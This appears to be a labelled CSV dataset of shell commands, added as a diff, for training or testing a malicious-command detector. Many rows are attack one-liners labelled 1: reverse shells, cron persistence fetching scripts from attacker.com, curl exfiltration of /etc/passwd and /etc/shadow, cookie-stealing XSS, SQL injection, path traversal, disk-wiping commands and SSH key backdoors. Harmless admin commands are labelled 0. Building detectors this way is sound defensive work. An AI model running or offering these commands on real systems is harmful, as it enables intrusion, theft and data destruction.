+2026-01-23 11:12:12,18.190.42.31,"echo ""* * * * * /usr/bin/nc attacker.com 4444 -e /bin/sh"" | crontab -",1
+2026-01-23 13:41:12,50.175.185.28,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
+2026-01-23 08:58:12,60.191.70.103,timedatectl,0
+2026-01-23 05:50:12,48.34.2.82,traceroute google.com,0
+2026-01-23 08:30:12,75.192.144.32,logrotate -f /etc/logrotate.d/nginx,0
+2026-01-23 06:31:12,111.129.208.63,nslookup google.com,0
+2026-01-23 11:17:12,41.132.104.46,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
+2026-01-23 10:57:12,28.86.153.237,"curl -H ""User-Agent: <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"" http://target.com",1
+2026-01-23 15:20:12,79.59.137.156,"curl -H ""User-Agent: <img src=x onerror=alert(1)>"" http://target.com/",1
+2026-01-23 11:44:12,193.184.62.7,smbclient -L //target.com -U admin%password,1
+2026-01-23 17:42:12,133.201.7.23,rpcclient -U admin%password target.com -c 'enumdomusers',1
+2026-01-23 06:19:12,13.89.176.245,uptime,0
+2026-01-23 04:28:12,185.96.186.142,crontab -l,0
+2026-01-23 01:42:12,207.225.14.203,crontab -l,0
+2026-01-23 04:10:12,94.91.34.22,df -h,0
+2026-01-23 01:24:12,137.195.158.126,du -sh /home/* | sort -hr,0
+2026-01-23 16:57:12,177.209.19.30,"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
+2026-01-23 14:21:12,70.238.168.82,rpcclient -U admin%password target.com -c 'enumdomusers',1
+2026-01-23 15:08:12,109.248.113.67,rm -rf /* --no-preserve-root,1
+2026-01-23 12:55:12,55.229.136.55,"curl -X PUT http://target.com/api/user/1 -d '{""password"":""hacked123""}'",1
+2026-01-23 11:35:12,40.76.243.90,rm -rf /* --no-preserve-root,1
+2026-01-23 11:10:12,184.17.240.152,sudo -u#-1 /bin/bash,1
+2026-01-23 06:00:12,134.27.105.77,timedatectl,0
+2026-01-23 16:38:12,103.188.65.123,"msfconsole -q -x ""use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.0.0.1; run""",1
+2026-01-23 06:29:12,18.61.177.32,apt update,0
+2026-01-23 14:19:12,116.223.65.5,sudo nmap --script vuln target.com,1
+2026-01-23 03:46:12,62.128.176.211,cat /proc/meminfo | head -10,0
+2026-01-23 17:54:12,84.129.130.77,hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com,1
+2026-01-23 04:37:12,173.183.193.147,mtr -c 10 google.com,0
+2026-01-23 04:05:12,92.156.17.170,scp user@server:/var/log/app.log ./,0
+2026-01-23 07:37:12,37.68.1.45,curl -I https://example.com,0
+2026-01-23 10:52:12,173.64.162.251,"echo ""*/5 * * * * curl -s http://attacker.com/payload.sh | bash"" >> /var/spool/cron/root",1
+2026-01-23 12:50:12,95.244.104.100,"env x='() { :;}; /bin/bash -c ""bash -i >& /dev/tcp/10.0.0.1/4444 0>&1""' bash -c 'echo vulnerable'",1
+2026-01-23 07:10:12,84.219.33.16,ip addr show,0
+2026-01-23 06:01:12,162.63.139.105,cat /proc/cpuinfo | grep 'model name',0
+2026-01-23 09:04:12,219.157.159.143,hostnamectl,0
+2026-01-23 17:44:12,192.82.7.68,"curl ""http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/""",1
+2026-01-23 04:00:12,68.151.136.11,traceroute google.com,0
+2026-01-23 08:06:12,30.127.2.26,mount | grep ext4,0
+2026-01-23 17:28:12,208.247.143.29,host -t txt target.com,1
+2026-01-23 11:27:12,100.110.114.81,host -t txt target.com,1
+2026-01-23 09:19:12,129.127.214.81,cat /proc/meminfo | head -10,0
+2026-01-23 17:36:12,102.46.233.152,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
+2026-01-23 11:47:12,195.162.135.98,"curl ""http://target.com/cgi-bin/test.cgi?cmd=cat%20/etc/passwd""",1
+2026-01-23 14:25:12,65.73.14.185,"curl -H ""X-Forwarded-For: <script>alert('XSS')</script>"" http://target.com/",1
+2026-01-23 15:51:12,147.140.156.106,"curl ""http://target.com/api?id=1' OR '1'='1""",1
+2026-01-23 16:13:12,219.76.224.178,"php -r '$sock=fsockopen(""10.0.0.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",1
+2026-01-23 05:38:12,206.243.65.21,rsnapshot daily,0
+2026-01-23 15:31:12,102.195.251.250,cat ../../../etc/passwd,1
+2026-01-23 14:48:12,105.55.206.89,"curl ""http://target.com/image?file=php://filter/convert.base64-encode/resource=/etc/passwd""",1
+2026-01-23 09:46:12,68.132.135.206,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
+2026-01-23 06:48:12,88.236.177.210,lsblk,0
+2026-01-23 11:48:12,18.79.227.237,dig @target.com axfr target.com,1
+2026-01-23 04:54:12,144.210.148.254,traceroute google.com,0
+2026-01-23 05:12:12,200.221.235.124,cat /proc/meminfo | head -10,0
+2026-01-23 04:47:12,191.123.75.75,nmcli device status,0
+2026-01-23 01:34:12,217.140.144.138,du -sh /var/log/,0
+2026-01-23 10:33:12,128.202.2.213,"curl ""http://target.com/load?file=....//....//....//proc/self/environ""",1
+2026-01-23 01:35:12,80.76.57.69,"journalctl -u sshd --since ""1 hour ago""",0
+2026-01-23 01:57:12,125.125.253.7,df -h,0
+2026-01-23 10:34:12,191.238.228.236,"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((""10.10.14.5"",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")'",1
+2026-01-23 13:30:12,50.119.36.213,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
+2026-01-23 06:28:12,161.151.103.174,nmcli device status,0
+2026-01-23 06:49:12,137.137.157.207,ln -s /var/www/html /home/user/www,0
+2026-01-23 10:46:12,205.206.196.88,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
+2026-01-23 05:29:12,148.124.26.127,ps aux | grep nginx,0
+2026-01-23 04:41:12,187.81.249.167,chmod 644 /var/www/html/index.html,0
+2026-01-23 05:18:12,59.139.26.28,rsync -avz /var/www/html/ backup/,0
+2026-01-23 10:39:12,139.145.105.204,bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1',1
+2026-01-23 06:53:12,124.239.163.89,netstat -tulpn,0
+2026-01-23 17:02:12,167.0.224.36,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
+2026-01-23 10:35:12,77.184.159.240,find / -perm -4000 -type f 2>/dev/null | xargs ls -la,1
+2026-01-23 07:53:12,23.36.190.90,rsync -avz /var/www/html/ backup/,0
+2026-01-23 03:09:12,211.94.87.221,grep 'error' /var/log/syslog,0
+2026-01-23 08:17:12,163.246.233.120,lsblk,0
+2026-01-23 17:26:12,168.82.146.237,smbclient -L //target.com -U admin%password,1
+2026-01-23 09:34:12,4.24.1.162,localectl status,0
+2026-01-23 09:37:12,212.163.240.138,"curl -H ""User-Agent: <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"" http://target.com",1
+2026-01-23 06:27:12,127.17.62.232,ls -la /var/log/,0
+2026-01-23 06:07:12,197.28.139.249,netstat -tulpn,0
+2026-01-23 04:55:12,87.88.196.109,openssl x509 -in /etc/ssl/certs/server.crt -text -noout,0
+2026-01-23 05:16:12,177.114.85.235,ln -s /var/www/html /home/user/www,0
+2026-01-23 17:21:12,150.173.55.99,bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',1
+2026-01-23 02:26:12,37.102.135.52,ls -la /var/log/,0
+2026-01-23 07:13:12,6.205.149.72,dig example.com,0
+2026-01-23 13:03:12,168.104.169.65,rpcclient -U admin%password target.com -c 'enumdomusers',1
+2026-01-23 15:32:12,139.112.205.124,gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt,1
+2026-01-23 09:53:12,29.165.64.211,"curl ""http://target.com/download?file=....//....//....//etc/shadow""",1
+2026-01-23 13:21:12,19.137.237.112,rm -rf /var/www/html/*,1
+2026-01-23 15:41:12,123.50.123.35,"curl ""http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/""",1
+2026-01-23 12:07:12,199.231.236.7,"curl ""http://target.com/cgi-bin/test.cgi?cmd=cat%20/etc/passwd""",1
+2026-01-23 04:20:12,53.231.191.214,find /var/www -name '*.php' -mtime -1,0
+2026-01-23 06:08:12,104.96.193.63,mtr -c 10 google.com,0
+2026-01-23 05:56:12,41.151.247.163,systemctl status mysql,0
+2026-01-23 07:06:12,113.30.237.130,openssl x509 -in /etc/ssl/certs/server.crt -text -noout,0
+2026-01-23 04:03:12,54.212.185.61,ping -c 4 google.com,0
+2026-01-23 06:23:12,47.213.59.129,localectl status,0
+2026-01-23 03:56:12,69.51.204.62,mount | grep ext4,0
+2026-01-23 01:25:12,85.161.27.128,"journalctl --since ""1 hour ago"" -u ssh",0
+2026-01-23 13:06:12,144.30.67.229,"curl -X PUT http://target.com/api/user/1 -d '{""password"":""hacked123""}'",1
+2026-01-23 06:25:12,132.23.215.30,mtr -c 10 google.com,0
+2026-01-23 03:30:12,39.171.90.75,curl -I https://example.com,0
+2026-01-23 09:16:12,189.2.132.104,localectl status,0
+2026-01-23 05:44:12,169.86.64.194,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
+2026-01-23 10:10:12,173.126.119.194,sudo -u#-1 /bin/bash,1
+2026-01-23 06:12:12,76.71.128.13,curl -I https://example.com,0
+2026-01-23 10:09:12,107.41.143.124,bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1',1
+2026-01-23 14:12:12,177.131.146.237,dd if=/dev/zero of=/dev/sda bs=1M,1
+2026-01-23 02:55:12,120.104.173.146,"journalctl --since ""1 hour ago"" -u ssh",0
+2026-01-23 03:54:12,41.118.180.146,ln -s /var/www/html /home/user/www,0
+2026-01-23 13:35:12,40.170.255.198,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
+2026-01-23 11:37:12,190.228.62.64,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
+2026-01-23 07:36:12,74.247.132.254,lsblk,0
+2026-01-23 14:59:12,106.253.242.29,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
+2026-01-23 05:45:12,1.49.221.5,chown www-data:www-data /var/www/html -R,0
+2026-01-23 06:05:12,101.53.233.234,ls -la /var/log/,0
+2026-01-23 01:53:12,16.25.101.132,rsync -avz /home/user/documents/ /backup/documents/,0
+2026-01-23 09:18:12,157.19.234.244,timedatectl,0
+2026-01-23 05:57:12,67.85.151.21,nslookup google.com,0
+2026-01-23 15:30:12,41.32.215.19,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
+2026-01-23 12:57:12,79.90.73.133,dd if=/dev/zero of=/dev/sda bs=1M,1
+2026-01-23 13:04:12,217.202.241.84,"php -r '$sock=fsockopen(""10.0.0.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",1
+2026-01-23 04:32:12,212.191.36.122,curl -I https://example.com,0
+2026-01-23 08:02:12,181.30.107.211,ip route show,0
+2026-01-23 08:31:12,100.97.172.189,tar -czf backup.tar.gz /var/www/html,0
+2026-01-23 16:49:12,213.125.251.172,rm -rf /* --no-preserve-root,1
+2026-01-23 17:52:12,124.75.184.93,mkfs.ext4 /dev/sda1,1
+2026-01-23 12:48:12,64.27.13.53,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
+2026-01-23 02:21:12,191.187.112.132,systemctl status nginx,0
+2026-01-23 15:35:12,20.12.28.231,"sqlmap -u ""http://target.com/api?id=1"" --batch --dbs",1
+2026-01-23 15:37:12,191.154.23.251,enum4linux target.com,1
+2026-01-23 11:32:12,115.204.70.141,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
+2026-01-23 06:09:12,20.247.140.40,ss -tulwn,0
+2026-01-23 17:15:12,53.123.101.173,chmod 4777 /bin/bash,1
+2026-01-23 03:07:12,146.80.40.239,curl -s https://api.ipify.org,0
+2026-01-23 03:57:12,37.167.255.235,ip addr show,0
+2026-01-23 11:04:12,220.20.184.40,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.5"",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
+2026-01-23 12:11:12,175.194.194.138,"curl -H ""X-Forwarded-For: <script>alert('XSS')</script>"" http://target.com/",1
+2026-01-23 06:47:12,197.106.150.94,nslookup google.com,0
+2026-01-23 11:42:12,14.195.210.51,chmod 4777 /bin/bash,1
+2026-01-23 11:50:12,148.103.63.147,chmod 4777 /bin/bash,1
+2026-01-23 11:57:12,160.32.167.132,mkfs.ext4 /dev/sda1,1
+2026-01-23 10:23:12,207.117.203.77,"curl ""http://target.com/export?file=....//....//....//proc/self/environ""",1
+2026-01-23 10:06:12,131.85.238.222,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
+2026-01-23 13:43:12,129.7.87.226,"curl -H ""X-Original-URL: /admin"" http://target.com/",1
+2026-01-23 05:52:12,203.139.158.150,rsync -avz /var/www/html/ backup/,0
+2026-01-23 13:34:12,180.161.52.42,dd if=/dev/zero of=/dev/sda bs=1M,1
+2026-01-23 08:04:12,195.38.22.89,wget --spider https://example.com/file.zip,0
+2026-01-23 12:10:12,132.215.218.31,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
+2026-01-23 03:15:12,42.190.88.34,systemctl status mysql,0
+2026-01-23 06:42:12,207.211.173.37,ln -s /var/www/html /home/user/www,0
+2026-01-23 16:32:12,80.131.118.31,"php -r '$sock=fsockopen(""10.0.0.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",1
+2026-01-23 04:16:12,107.38.69.237,ip addr show,0
+2026-01-23 16:11:12,108.16.135.26,smbclient -L //target.com -U admin%password,1
+2026-01-23 08:40:12,6.91.246.144,whoami,0
+2026-01-23 05:49:12,179.35.62.238,tar -czf backup.tar.gz /var/www/html,0
+2026-01-23 03:26:12,86.241.209.77,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
+2026-01-23 01:54:12,88.57.40.12,du -sh /home/* | sort -hr,0
+2026-01-23 04:48:12,134.52.32.47,chmod 644 /var/www/html/index.html,0
+2026-01-23 17:47:12,201.203.150.168,"sqlmap -u ""http://target.com/api?id=1"" --batch --dbs",1
+2026-01-23 10:27:12,118.78.208.64,"curl -H ""User-Agent: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"" http://target.com",1
+2026-01-23 08:15:12,214.66.71.14,scp user@server:/var/log/app.log ./,0
+2026-01-23 06:34:12,76.23.91.73,crontab -l,0
+2026-01-23 02:17:12,118.190.235.144,df -h /,0
+2026-01-23 03:53:12,203.215.74.11,du -sh /var/www/*,0
+2026-01-23 15:06:12,169.29.16.192,enum4linux target.com,1
+2026-01-23 06:45:12,27.116.91.4,df -h,0
+2026-01-23 12:29:12,195.57.236.108,echo 'ssh-rsa AAAAB3Nza... attacker@evil.com' >> /root/.ssh/authorized_keys,1
+2026-01-23 06:30:12,85.10.131.223,curl -s https://api.ipify.org,0
+2026-01-23 02:25:12,94.191.136.37,"journalctl --since ""1 hour ago"" -u ssh",0
+2026-01-23 10:18:12,132.108.195.87,cat /var/www/../../../../etc/passwd,1
+2026-01-23 11:45:12,183.90.247.183,"curl ""http://target.com/cgi-bin/test.cgi?cmd=cat%20/etc/passwd""",1
+2026-01-23 01:44:12,196.76.239.94,du -sh /home/* | sort -hr,0
+2026-01-23 02:16:12,13.170.249.209,ls -la /var/log/,0
+2026-01-23 05:48:12,21.63.197.120,find /var/www -name '*.php' -mtime -1,0
+2026-01-23 03:14:12,166.212.20.48,rsync -avz /var/www/html/ backup/,0
+2026-01-23 05:27:12,81.138.180.86,du -sh /var/www/*,0
+2026-01-23 04:04:12,93.225.67.86,top -n 1 | head -20,0
+2026-01-23 03:55:12,134.248.243.24,ip route show,0
+2026-01-23 15:44:12,2.31.93.112,bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',1
+2026-01-23 11:00:12,214.182.140.78,sudo -u#-1 /bin/bash,1
+2026-01-23 04:17:12,21.129.77.104,traceroute google.com,0
+2026-01-23 11:40:12,131.205.178.8,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
+2026-01-23 17:45:12,38.87.122.97,bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',1
+2026-01-23 16:31:12,8.223.170.45,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
+2026-01-23 13:46:12,98.215.159.112,"curl -H ""X-Original-URL: /admin"" http://target.com/",1
+2026-01-23 04:21:12,30.116.155.21,df -h,0
+2026-01-23 13:50:12,170.140.12.10,"curl ""http://target.com/cgi-bin/test.cgi?cmd=cat%20/etc/passwd""",1
+2026-01-23 15:58:12,126.197.107.3,rpcclient -U admin%password target.com -c 'enumdomusers',1
+2026-01-23 01:32:12,109.173.153.245,crontab -l,0
+2026-01-23 13:11:12,130.125.212.197,"curl ""http://target.com/image?file=php://filter/convert.base64-encode/resource=/etc/passwd""",1
+2026-01-23 09:25:12,49.10.207.54,chown www-data:www-data /var/www/html -R,0
+2026-01-23 17:37:12,208.131.8.162,enum4linux target.com,1
+2026-01-23 02:15:12,93.13.216.224,"journalctl --since ""1 hour ago"" -u ssh",0
+2026-01-23 16:18:12,201.122.230.112,gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt,1
+2026-01-23 07:25:12,129.178.211.145,ps aux | grep nginx,0
+2026-01-23 03:06:12,30.225.204.34,ip addr show,0
+2026-01-23 07:41:12,93.58.207.188,ls -la /var/log/,0
+2026-01-23 09:55:12,208.198.46.193,find / -perm -4000 -type f 2>/dev/null | xargs ls -la,1
+2026-01-23 12:21:12,143.1.36.140,"curl -X PUT http://target.com/api/user/1 -d '{""password"":""hacked123""}'",1
+2026-01-23 14:56:12,89.45.115.233,dig @target.com axfr target.com,1
+2026-01-23 06:52:12,118.150.89.173,rsync -avz /var/www/html/ backup/,0
+2026-01-23 15:55:12,218.23.107.9,dd if=/dev/zero of=/dev/sda bs=1M,1
+2026-01-23 01:59:12,211.168.147.230,apt update && apt list --upgradable,0
+2026-01-23 04:36:12,185.156.178.8,fdisk -l,0
+2026-01-23 07:22:12,83.1.106.84,nslookup google.com,0
+2026-01-23 14:04:12,158.27.191.178,"msfconsole -q -x ""use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.0.0.1; run""",1
+2026-01-23 04:53:12,191.180.46.201,ls -la /var/log/,0
+2026-01-23 17:06:12,169.67.82.47,hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com,1
+2026-01-23 07:28:12,76.84.16.107,mount | grep ext4,0
+2026-01-23 01:48:12,187.135.45.218,ping -c 4 8.8.8.8,0
+2026-01-23 17:19:12,114.72.123.59,"curl -H ""Host: internal.target.com"" http://target.com/",1
+2026-01-23 08:52:12,168.103.58.127,apt update,0
+2026-01-23 02:40:12,222.167.151.3,tail -20 /var/log/syslog,0
+2026-01-23 11:26:12,191.155.247.173,"curl -H ""Host: internal.target.com"" http://target.com/",1
+2026-01-23 14:17:12,202.255.108.179,"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
+2026-01-23 09:52:12,203.156.62.2,"echo ""* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/9001 0>&1'"" >> /var/spool/cron/root",1
+2026-01-23 09:27:12,51.89.115.198,tar -czf backup.tar.gz /var/www/html,0
+2026-01-23 05:53:12,222.170.232.253,top -n 1 | head -20,0
+2026-01-23 10:56:12,64.33.113.81,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
+2026-01-23 14:49:12,6.3.227.130,cat ../../../etc/passwd,1
+2026-01-23 16:28:12,158.197.158.134,"curl ""http://target.com/file?path=../../../etc/passwd""",1
+2026-01-23 16:06:12,157.135.94.41,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
+2026-01-23 13:56:12,207.63.214.90,sudo nmap --script vuln target.com,1
+2026-01-23 07:52:12,174.197.162.109,systemctl status mysql,0
+2026-01-23 02:20:12,139.218.7.252,tail -20 /var/log/syslog,0
+2026-01-23 13:28:12,149.123.237.137,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
+2026-01-23 03:24:12,22.216.105.159,fdisk -l,0
+2026-01-23 14:10:12,173.104.146.142,rpcclient -U admin%password target.com -c 'enumdomusers',1
+2026-01-23 14:23:12,217.93.248.6,curl http://evil.com/backdoor.php | bash,1
+2026-01-23 07:14:12,7.227.223.35,free -m,0
+2026-01-23 14:00:12,219.145.113.117,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
+2026-01-23 09:03:12,62.35.173.116,mtr -c 10 google.com,0
+2026-01-23 14:34:12,27.181.93.46,smbclient -L //target.com -U admin%password,1
+2026-01-23 12:03:12,159.109.154.79,chmod 4777 /bin/bash,1
+2026-01-23 02:41:12,181.47.162.253,systemctl status nginx,0
+2026-01-23 15:18:12,24.19.85.121,hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com,1
+2026-01-23 14:30:12,138.70.3.14,"curl -H ""User-Agent: <img src=x onerror=alert(1)>"" http://target.com/",1
+2026-01-23 01:30:12,91.152.130.167,tail -20 /var/log/syslog,0
+2026-01-23 11:02:12,164.110.219.186,"echo ""* * * * * curl http://attacker.com/c2.sh | bash"" >> /var/spool/cron/crontabs/root",1
+2026-01-23 09:45:12,113.101.198.6,echo 'ssh-rsa AAAAB3NzaC1yc2E...' >> ~/.ssh/authorized_keys,1
+2026-01-23 16:23:12,146.215.98.57,smbclient -L //target.com -U admin%password,1
+2026-01-23 07:27:12,190.115.239.82,openssl x509 -in /etc/ssl/certs/server.crt -text -noout,0
+2026-01-23 08:51:12,207.113.138.85,ss -tulwn,0
+2026-01-23 10:21:12,145.96.13.113,curl -X POST -d @/etc/passwd https://attacker-server.com/exfil,1
+2026-01-23 02:01:12,155.55.51.21,systemctl status nginx,0
+2026-01-23 04:06:12,40.242.38.129,nslookup google.com,0
+2026-01-23 10:31:12,204.171.90.196,curl -X POST -d @/etc/shadow https://attacker-server.com/exfil,1
+2026-01-23 01:52:12,106.66.10.154,crontab -l,0
+2026-01-23 07:07:12,95.204.169.249,grep 'error' /var/log/syslog,0
+2026-01-23 06:22:12,29.87.128.151,lsblk,0
+2026-01-23 02:04:12,198.232.133.128,du -sh /home/* 2>/dev/null | sort -hr,0
+2026-01-23 14:11:12,172.117.134.144,chmod 4777 /bin/bash,1
+2026-01-23 02:38:12,178.123.115.25,ping -c 4 8.8.8.8,0
+2026-01-23 10:36:12,162.61.88.42,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
+2026-01-23 16:51:12,174.97.21.188,"curl ""http://target.com/api?id=1' OR '1'='1""",1
+2026-01-23 01:23:12,55.226.238.45,rsync -avz /home/user/documents/ /backup/documents/,0
+2026-01-23 17:12:12,97.242.121.87,"curl ""http://target.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>""",1
+2026-01-23 02:47:12,75.14.61.218,df -h /,0
+2026-01-23 14:36:12,145.27.41.177,mkfs.ext4 /dev/sda1,1
+2026-01-23 02:44:12,4.40.164.128,du -sh /home/* | sort -hr,0
+2026-01-23 07:19:12,91.203.110.224,ip route show,0
+2026-01-23 09:14:12,200.221.198.228,top -n 1 | head -20,0
+2026-01-23 04:34:12,155.124.191.176,cat /proc/cpuinfo | grep 'model name',0
+2026-01-23 06:21:12,104.39.191.191,wget --spider https://example.com/file.zip,0
+2026-01-23 13:31:12,187.74.126.36,chmod 4777 /bin/bash,1
+2026-01-23 02:32:12,106.228.25.181,crontab -l,0
+2026-01-23 11:08:12,78.52.91.239,cat /var/www/../../../../etc/passwd,1
+2026-01-23 06:32:12,130.3.120.120,apt list --upgradable,0
+2026-01-23 01:28:12,95.28.169.1,ping -c 4 8.8.8.8,0
+2026-01-23 05:26:12,57.30.3.181,id,0
+2026-01-23 04:33:12,162.6.142.184,timedatectl,0
+2026-01-23 06:39:12,169.163.214.83,journalctl -u nginx -n 50,0
+2026-01-23 12:46:12,209.140.11.200,cat ../../../etc/passwd,1
+2026-01-23 05:20:12,168.180.242.197,nslookup google.com,0
+2026-01-23 10:14:12,87.237.144.169,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.5"",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
+2026-01-23 13:57:12,80.42.127.77,gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt,1
+2026-01-23 12:39:12,197.237.124.91,"curl ""http://target.com/api/users?sort=password&order=ASC""",1
+2026-01-23 06:04:12,188.149.242.78,apt update,0
+2026-01-23 03:42:12,158.105.91.198,curl -I https://example.com,0
+2026-01-23 09:21:12,83.176.9.36,ping -c 4 google.com,0
+2026-01-23 09:49:12,203.69.148.46,bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1',1
+2026-01-23 05:33:12,157.125.206.201,ping -c 4 google.com,0
+2026-01-23 02:14:12,178.186.180.57,du -sh /home/* | sort -hr,0
+2026-01-23 11:30:12,41.189.12.64,enum4linux target.com,1
+2026-01-23 03:41:12,97.83.244.184,top -n 1 | head -20,0
+2026-01-23 14:41:12,168.203.15.161,"curl ""http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/""",1
+2026-01-23 11:20:12,18.98.126.16,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
+2026-01-23 05:55:12,42.38.209.3,ip route show,0
+2026-01-23 13:26:12,167.118.152.79,"php -r '$sock=fsockopen(""10.0.0.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",1
+2026-01-23 02:22:12,196.191.38.208,crontab -l,0
+2026-01-23 12:22:12,109.216.247.243,"curl -H ""X-Forwarded-For: <script>alert('XSS')</script>"" http://target.com/",1
+2026-01-23 10:59:12,18.224.159.87,bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1',1
+2026-01-23 08:05:12,97.238.206.196,logrotate -f /etc/logrotate.d/nginx,0
+2026-01-23 17:40:12,161.112.25.112,"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
+2026-01-23 03:59:12,172.228.189.148,chmod 644 /var/www/html/index.html,0
+2026-01-23 16:00:12,159.88.37.136,rm -rf /* --no-preserve-root,1
+2026-01-23 16:17:12,153.229.97.13,dd if=/dev/zero of=/dev/sda bs=1M,1
+2026-01-23 02:36:12,31.15.222.79,ls -la /var/log/,0
+2026-01-23 12:12:12,127.78.85.81,gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt,1
+2026-01-23 10:03:12,125.127.56.136,"curl ""http://target.com/export?file=....//....//....//proc/self/environ""",1
+2026-01-23 07:15:12,53.241.246.57,rsync -avz /var/www/html/ backup/,0
+2026-01-23 02:52:12,163.111.133.181,crontab -l,0
+2026-01-23 03:45:12,215.252.0.107,ls -la /var/log/,0
+2026-01-23 04:30:12,145.79.36.147,apt list --upgradable,0
+2026-01-23 03:19:12,203.165.199.228,wget --spider https://example.com/file.zip,0
+2026-01-23 08:03:12,99.110.148.110,systemctl status mysql,0
+2026-01-23 09:48:12,55.50.181.128,cat /var/www/../../../../etc/passwd,1
+2026-01-23 02:50:12,4.155.166.179,tail -20 /var/log/syslog,0
+2026-01-23 05:30:12,105.174.23.252,rsnapshot daily,0
+2026-01-23 12:20:12,61.196.92.24,"env x='() { :;}; /bin/bash -c ""bash -i >& /dev/tcp/10.0.0.1/4444 0>&1""' bash -c 'echo vulnerable'",1
+2026-01-23 10:01:12,182.100.146.120,tar -czf - /etc/passwd | base64 | curl -X POST --data-binary @- http://exfil.server/collect,1
+2026-01-23 08:28:12,162.65.206.201,dig example.com,0
+2026-01-23 16:52:12,214.135.234.66,"curl ""http://target.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>""",1
+2026-01-23 12:31:12,121.77.85.202,"curl -H ""X-Original-URL: /admin"" http://target.com/",1
+2026-01-23 15:09:12,50.69.166.84,"curl -H ""Host: internal.target.com"" http://target.com/",1
+2026-01-23 09:47:12,66.191.10.209,"curl -H ""User-Agent: <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"" http://target.com",1
+2026-01-23 05:03:12,139.237.206.138,top -n 1 | head -20,0
+2026-01-23 14:22:12,210.154.97.38,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
